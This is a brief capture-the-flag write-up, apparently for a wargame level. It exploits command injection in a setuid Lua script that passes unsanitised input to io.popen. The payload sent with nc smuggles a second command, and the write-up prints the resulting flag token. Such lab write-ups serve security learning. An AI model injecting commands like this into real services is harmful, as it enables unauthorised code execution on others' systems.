```sh
$> ls -l
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua

$> cat level11.lua
[...]
prog = io.popen("echo "..pass.." | sha1sum", "r")
[...]
```

`pass` is not protected, we can inject some commands here

```sh
$> echo '; getflag > /tmp/tok' | nc 127.0.0.1 5151

$> cat /tmp/tok
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
